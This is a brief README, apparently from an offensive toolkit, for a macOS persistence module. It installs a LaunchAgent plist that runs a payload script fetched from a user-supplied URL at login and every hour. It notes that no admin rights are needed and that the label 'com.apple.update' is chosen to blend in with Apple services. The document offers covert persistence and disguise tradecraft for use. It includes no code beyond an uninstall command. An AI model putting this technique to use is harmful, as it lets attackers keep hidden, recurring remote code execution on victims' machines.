# macOS LaunchAgent Persistence

Installs a `LaunchAgent` plist that runs a payload script at login and every hour.

- **Output:** `~/Library/LaunchAgents/com.apple.update.plist`
- **Requirements:** Replace `PAYLOAD_URL` with the URL of your payload script
- **Runs:** At login and every 3600 seconds (1 hour)
- **Remove:** `launchctl unload ~/Library/LaunchAgents/com.apple.update.plist && rm ~/Library/LaunchAgents/com.apple.update.plist`
- **Note:** User-level — no admin required. The plist label `com.apple.update` blends in with Apple services.
